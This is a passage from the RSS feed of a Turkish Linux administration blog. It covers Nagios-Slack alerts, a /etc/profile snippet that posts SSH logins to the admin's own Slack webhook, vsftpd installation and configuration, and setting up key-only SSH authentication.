class="n"&gt;NOTIFICATIONTYPE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$NOTIFICATIONTYPE$&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ben Nagios üzerine MySQL server kontrolünü de eklemiştim. Şimdi MySQL servisimizi durduralım. 18:34:36'da MySQL servisi durdurdum.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/mysql_stop.png" /&gt;&lt;/p&gt;
&lt;p&gt;18:35:19'da da Nagios MySQL servisine erişemediğine dair bildirimi göndermiş.
&lt;img alt="" src="assets/images/nagios_alert.png" /&gt;&lt;/p&gt;
&lt;p&gt;Aynı esnada cep telefonuma da bildirim geldi.
&lt;img alt="" src="assets/images/slack_android.png" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">admin</dc:creator><pubDate>Mon, 12 Sep 2016 18:56:00 +0300</pubDate><guid>tag:,2016-09-12:slack-nagios-entegrasyonu.html</guid></item><item><title>[SLACK] SSH Girişlerini Bildirim Olarak Almak</title><link>/slack-ssh-girislerini-bildirim-olarak-almak.html</link><description>&lt;p&gt;Merhabalar.
Bu yazımızda daha çok geliştirici ekiplerinin kullandığı ekip içi yazışma ortamı sağlayan Slack ile ilgili çalışma gerçekleştireceğiz.
Artık ekip içi yazışmalarınızı, iş atamalarınızı (busybot) Slack üzerinden yaptığınıza göre fazlalıklardan kurtulmak isteyebilirsiniz. Şahsen ben çok fazla ortam kullanmayı tercih etmek yerine, tek yerden bir dashboard mantığında herşeyi görebilmek isterim. Kısa bir girizgahından ardından giriş yapalım.&lt;/p&gt;
&lt;p&gt;Slack'de çoğu uygulama gibi webhook yapısına uygun tasarlanmıştır. Webhook farklı uygulamaların birbirleri ile entegrasyon sağlayabilmeleri için Uygulama içerisinde oluşan event'leri HTTP üzerinden JSON Payload'ları ile kendilerine subscribe olan diğer uygulamaları tetiklemesidir. Tabii bu işlemi yapabilmeniz için webhook izinlerini sağlamanız gerekmektedir.&lt;/p&gt;
&lt;h2&gt;Slack için token oluşturalım.&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://api.slack.com/incoming-webhooks"&gt;Buraya&lt;/a&gt; tıklayarak &lt;strong&gt;Integration Settings&lt;/strong&gt; alanından yapılandırma ayarlarına ulaşabilirsiniz.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Post to Channel:&lt;/strong&gt; Gönderim yapacağınız kanal&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Webhook URL :&lt;/strong&gt; Kanalı seçmeniz ardından bu URL dinamik olarak oluşacaktır. Bu URL'yi sonra ki aşamalarda kullanacağımızdan dolayı saklamanız gerekmektedir.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Descriptive Label:&lt;/strong&gt; Dilerseniz opsiyonel olarak açıklama etiketi girebilirsiniz.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Customize Name:&lt;/strong&gt; Gelen bildirimlerde yer alan kullanıcı adını seçebilirsiniz.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Customize Icon:&lt;/strong&gt; Gelen bildirimlerde yer alan iconu değiştirebilirsiniz.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Preview Message:&lt;/strong&gt; Bu alandan da gelecek bildirimi önizleme olarak görebilirsiniz.&lt;/p&gt;
&lt;p&gt;Ayarları &lt;strong&gt;"Save Settings"&lt;/strong&gt; butonu ile birlikte kaydediyoruz.&lt;/p&gt;
&lt;h2&gt;SSH ile yapılan girişlerde bildirim gelmesini sağlayalım.&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;/etc/profile&lt;/strong&gt; dosyasını editör ile açtıktan sonra en alt kısmına aşağıdaki kod blogunu ekleyebilirsiniz. &lt;strong&gt;"WEBHOOK_URL"&lt;/strong&gt; alanını yukarıda saklamanızı istediğim alanla değiştirmeyi unutmayınız.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;    if [ -n &amp;quot;&lt;span class="nv"&gt;$SSH_CLIENT&lt;/span&gt;&amp;quot; ]; then
      TEXT=&amp;quot;$(date): ssh login to &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;USER&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;@$(hostname -f)&amp;quot;
      TEXT=&amp;quot;&lt;span class="nv"&gt;$TEXT&lt;/span&gt; from $(echo &lt;span class="nv"&gt;$SSH_CLIENT&lt;/span&gt;|awk &amp;#39;{print $1}&amp;#39;)&amp;quot;
      curl -X POST \
      --data-urlencode &amp;quot;payload={\&amp;quot;username\&amp;quot;: \&amp;quot;SSH Login Alerts\&amp;quot;, \&amp;quot;text\&amp;quot;: \&amp;quot;&lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;TEXT&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;\&amp;quot;}&amp;quot; \
      WEBHOOK_URL &lt;span class="err"&gt;&amp;amp;&lt;/span&gt;&amp;gt;/dev/null &lt;span class="err"&gt;&amp;amp;&lt;/span&gt;
    fi
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yukarıdaki kod blogunu açıklamak gerekirse, sadece SSH işlemlerinde çalışacak şekilde ayarlanmıştır. date parametresinde zaman damgası, $USER bağlantıyı gerçekleştiren kullanıcı, $hostname ise bağlantı yapılan makina adını içerir. $SSH_CLIENT ise bağlantıyı gerçekleştiren kullanıcının IP adresini içerir ve bu AWK ile sadeleştirilmiştir. Akabinde curl ile birlikte POST isteği gerçekleştiriyoruz. Curl istekleri sonrasında response değerlerinin ekrana yazdırılmaması için /dev/null değeri kullandım. Böylece ssh yapan kullanıcı hiçbir şekilde çıktı göremeyecektir.&lt;/p&gt;
&lt;p&gt;Kendim Slack uygulamasını mobilde de kullandığımdan dolayı bildirimler cep telefonuma da direkt ulaşmaktadır.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/slack-bildirimi.png" /&gt;&lt;/p&gt;
&lt;p&gt;Hepsi bu kadar.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">admin</dc:creator><pubDate>Sun, 11 Sep 2016 22:05:00 +0300</pubDate><guid>tag:,2016-09-11:slack-ssh-girislerini-bildirim-olarak-almak.html</guid></item><item><title>VSFTPD Kurulumu ve Yapılandırma</title><link>/vsftpd-kurulumu-ve-yapilandirma.html</link><description>&lt;p&gt;Yazımıza başlamadan önemli bir hatırlatmak isterim. FTP Protokolü cleartext trafik içermesi nedeniyle
&lt;strong&gt;güvenli&lt;/strong&gt; değildir. Bu yüzden &lt;strong&gt;SFTP&lt;/strong&gt; protokolünü kullanmanızı öneririm.&lt;/p&gt;
&lt;h2&gt;Kurulum&lt;/h2&gt;
&lt;p&gt;Vsftpd server Ubuntu'nun default repolarından erişilebilmektedir. Ek olarak bir kaynak belirtmenize gerek yoktur.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;apt&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt; &lt;span class="n"&gt;vsftpd&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Yapılandırma&lt;/h2&gt;
&lt;p&gt;Vsftpd kurulumu ardından &lt;strong&gt;etc/vsftpd.conf&lt;/strong&gt; dosyası içerisinde yapılandırma ayarları bulunmaktadır. Bu dosya içerisinde aşağıdaki değişiklikleri yapmanızı öneririm.&lt;/p&gt;
&lt;p&gt;FTP için anonymous bağlantı gerçekleştirmelerini kapatmak için aşağıdaki değeri varsa yorum satırından çıkartıp, "NO" olarak belirtiyoruz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;anonymous_enable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;NO&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sunucu üzerinde yer alan kullanıcıların FTP'ye bağlanabilmelerini sağlamaları amacıyla aşağıdaki değeri varsa yorum satırından çıkartıp, "YES" olarak belirtiyoruz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;local_enable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;YES&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Kullanıcıların dosyalar üzerinde yazma işlemi yapabilmelerini sağlamaları amacıyla aşağıdaki değeri "YES" olarak belirtiyoruz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;write_enable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;YES&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Kullanıcıların home dizinlerine erişim hakkı vermek amacıyla aşağıdaki değeri "YES" olarak belirtiyoruz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;chroot_local_user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;YES&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Bu dosyayı kaydedip, çıkıyoruz.&lt;/p&gt;
&lt;h2&gt;FTP Kullanıcı Hesabı Oluşturma&lt;/h2&gt;
&lt;p&gt;Kullanıcı oluşturalım.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;adduser&lt;/span&gt; &lt;span class="n"&gt;ftpkullanicisi&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Kullanıcıyı oluşturduktan sonra, bu kullanıcıya ait dizin için root sahipliği verelim.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;chown&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ftpkullanicisi&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Şimdi ise kullanıcıya dosyalarını gönderebileceği bir klasör oluşturalım ve bu kullanıcıya erişim hakkı verelim.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;mkdir&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ftpkullanicisi&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dosyalar&lt;/span&gt;
&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;chown&lt;/span&gt; &lt;span class="n"&gt;ftpuser&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;ftpuser&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ftpkullanicisi&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;files&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vsftpd'yi yeniden başlatalım.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt; &lt;span class="n"&gt;vsftpd&lt;/span&gt; &lt;span class="n"&gt;restart&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tüm işlem bu kadar.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">admin</dc:creator><pubDate>Sat, 10 Sep 2016 21:37:00 +0300</pubDate><guid>tag:,2016-09-10:vsftpd-kurulumu-ve-yapilandirma.html</guid></item><item><title>Public / Private ile SSH Bağlantısı Sağlama</title><link>/public-private-ile-ssh-baglantisi-saglama.html</link><description>&lt;p&gt;Bu yazımızda public/private ikilisi ile birlikte SSH bağlantısı
sağlamayı akabinde ise sunucu üzerinde clear parola girilmesini yani
pub/private ikilileri olmadan bağlantı sağlanamamasını
gerçekleştireceğiz.&lt;/p&gt;
&lt;p&gt;Openssh-server kurulu değilse öncelikle olarak kurulumunu
gerçekleştirin.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;apt&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt; &lt;span class="n"&gt;openssh&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Client bilgisayar üzerinde anahtarlarınızı aşağıdaki komut ile birlikte
oluşturalım.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;keygen&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;rsa&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;root/.ssh&lt;/strong&gt; dizini altına &lt;strong&gt;id_rsa ve id_rsa.pub&lt;/strong&gt; dosyaları
oluşturulmuş olacaktır. &lt;strong&gt;id_rsa.pub&lt;/strong&gt; dosyanız uzantısından da
anlaşılacağı üzere public key dosyanızdır. &lt;strong&gt;id_rsa&lt;/strong&gt; ise iyi korunaklı
saklamanız gereken private key dosyanızdır.&lt;/p&gt;
&lt;p&gt;Artık public anahtarımızı bağlantı yapacağımız sunucuya gönderelim.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;id_rsa&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pub&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;umask&lt;/span&gt; &lt;span class="mo"&gt;077&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;authorized_keys&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Client bilgisayarda artık aşağıdaki komut ile birlikte uzak sunucuya
parola gerektirmeksizin bağlantı yapabilirsiniz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="n"&gt;uzaksunucu_ip&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Artık public/private ikilisi ile birlikte bağlantı yaptığımıza göre uzak
sunucu üzerinde parola ile girişleri kapatabiliriz. Bunun için
/etc/ssh/sshd_config kısmında aşağıdaki satırı bularak,&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Change to no to disable tunnelled clear text passwords&lt;/span&gt;
&lt;span class="c"&gt;#PasswordAuthentication yes&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;bununla değiştiriniz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;# Change to no to disable tunnelled clear text passwords&lt;/span&gt;
&lt;span class="n"&gt;PasswordAuthentication&lt;/span&gt; &lt;span class="n"&gt;no&lt;/span&gt;

&lt;span class="n"&gt;service&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="n"&gt;restart&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">admin</dc:creator><pubDate>Tue, 06 Sep 2016 09:10:00 +0300</pubDate><guid>tag:,2016-09-06:public-private-ile-ssh-baglantisi-saglama.html</guid></item></channel></rss>